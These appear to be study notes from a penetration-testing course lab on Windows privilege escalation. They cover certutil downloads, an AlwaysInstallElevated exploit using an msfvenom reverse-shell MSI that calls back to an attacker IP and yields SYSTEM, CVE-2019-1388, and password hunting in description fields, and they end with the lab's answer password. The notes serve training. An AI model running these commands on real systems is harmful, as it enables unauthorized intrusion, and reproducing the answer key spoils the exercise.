# Miscellaneous Techniques

## Living Off The Land Binaries and Scripts (LOLBAS)

{% embed url="https://lolbas-project.github.io" %}
binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems
{% endembed %}

### **Certutil**

**Transferring File with Certutil**

```powershell-session
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
```

**Encoding File with Certutil**

```cmd-session
C:\htb> certutil -encode file1 encodedfile
```

**Decoding File with Certutil**

```cmd-session
C:\htb> certutil -decode encodedfile file2
```

## Always Install Elevated

This setting can be set via Local Group Policy by setting `Always install with elevated privileges` to `Enabled` under the following paths.

* `Computer Configuration\Administrative Templates\Windows Components\Windows Installer`
* `User Configuration\Administrative Templates\Windows Components\Windows Installer`

![Group Policy Editor](https://academy.hackthebox.com/storage/modules/67/alwaysinstall.png)

**Enumerating Always Install Elevated Settings**

```powershell-session
PS C:\htb> reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

```powershell-session
PS C:\htb> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

`AlwaysInstallElevated` key exists, so the policy is indeed enabled on the target system.

**Generating MSI Package**

```shell-session
msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.3 lport=9443 -f msi > aie.msi
```

**Executing MSI Package**

```cmd-session
msiexec /i c:\users\htb-student\desktop\aie.msi /quiet /qn /norestart
```

**Catching Shell**

```shell-session
nc -lnvp 9443

. . .
C:\Windows\system32>whoami

whoami
nt authority\system
```

## CVE-2019-1388

privilege escalation vulnerability in the Windows Certificate Dialog

Let's run through the vulnerability in practice.

First right click on the `hhupd.exe` executable and select `Run as administrator`

![UAC](https://academy.hackthebox.com/storage/modules/67/hhupd.png)

Next, click on `Show information about the publisher's certificate` to open the certificate dialog. Here we can see that the `SpcSpAgencyInfo` field is populated in the Details tab.

![SpcSpAgencyInfo](https://academy.hackthebox.com/storage/modules/67/hhupd\_details.png)

Next, we go back to the General tab and see that the `Issued by` field is populated with a hyperlink. Click on it and then click `OK`, and the certificate dialog will close, and a browser window will launch.

![Issued by](https://academy.hackthebox.com/storage/modules/67/hhupd\_ok.png)

If we open `Task Manager`, we will see that the browser instance was launched as SYSTEM.

![The browser is running as SYSTEM user](https://academy.hackthebox.com/storage/modules/67/chrome\_system.png)

Next, we can right-click anywhere on the web page and choose `View page source`. Once the page source opens in another tab, right-click again and select `Save as`, and a `Save As` dialog box will open.

![Save the page source](https://academy.hackthebox.com/storage/modules/67/hhupd\_saveas.png)

At this point, we can launch any program we would like as SYSTEM. Type `c:\windows\system32\cmd.exe` in the file path and hit enter. If all goes to plan, we will have a cmd.exe instance running as SYSTEM.

![Launch CMD from saveas.](https://academy.hackthebox.com/storage/modules/67/hhupd\_cmd.png)

Scheduled Tasks

**Enumerating Scheduled Tasks with cmd**

```cmd-session
C:\htb>  schtasks /query /fo LIST /v
```

**Enumerating Scheduled Tasks with PowerShell**

```powershell-session
PS C:\htb> Get-ScheduledTask | select TaskName,State
```

> We cannot list out scheduled tasks created by other users

## User/Computer Description Field

**Checking Local User Description Field**

in Active Directory, it is possible for a sysadmin to store account details (such as a password) in a computer or user's account description field

```powershell-session
PS C:\htb> Get-LocalUser
 
Name            Enabled Description
----            ------- -----------
Administrator   True    Built-in account for administering the computer/domain
DefaultAccount  False   A user account managed by the system.
Guest           False   Built-in account for guest access to the computer/domain
helpdesk        True
htb-student     True
htb-student_adm True
jordan          True
logger          True
sarah           True
sccm_svc        True
secsvc          True    Network scanner - do not change password
sql_dev         True
```

**Enumerating Computer Description Field with Get-WmiObject Cmdlet**

```powershell-session
PS C:\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description
 
Description
-----------
The most vulnerable box ever!
```

## Mount VHDX/VMDK

**Mount VMDK on Linux**

```shell-session
guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk
```

**Mount VHD/VHDX on Linux**

```shell-session
guestmount --add WEBSRV10.vhdx  --ro /mnt/vhdx/ -m /dev/sda1
```

In Windows, we can right-click on the file and choose `Mount`, or use the `Disk Management` utility to mount a `.vhd` or `.vhdx` file.

## Assessment

Using the techniques in this section, find the cleartext password for an account on the target host.

<figure><img src="../../../.gitbook/assets/image (118) (1).png" alt=""><figcaption></figcaption></figure>

**!QAZXSW@3edc**



